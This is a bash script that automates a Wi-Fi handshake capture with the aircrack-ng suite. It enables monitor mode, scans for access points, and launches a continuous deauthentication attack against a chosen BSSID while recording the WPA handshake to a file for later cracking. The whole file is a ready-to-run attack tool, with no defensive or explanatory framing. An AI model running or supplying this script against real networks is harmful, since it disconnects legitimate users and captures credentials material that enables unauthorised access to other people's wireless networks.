#!/bin/bash

# Kill processes
sudo airmon-ng check kill

echo "Enter network interface: "
read interface

# Start monitor mode
sudo airmon-ng start $interface

# See network config
iwconfig


echo "Enter name of the interface that is on monitor mode: "
read interface

echo "Enter \"q\" two times to quite from capturing BSSID"
sleep 1

# Capturing BSSID
sudo airodump-ng $interface

echo "Enter BSSID : "
read bssid

echo "Enter Channel number: "
read c

echo "Enter file name save captured files: "
read filename

echo "Enter \"q\" two times to quite after capture Handshake"
sleep 1

# Deauthentication Attack
gnome-terminal -- sudo aireplay-ng --deauth 0 -a $bssid $interface &

# Capturing Handshake
sudo airodump-ng -w $filename -c $c --bssid $bssid $interface
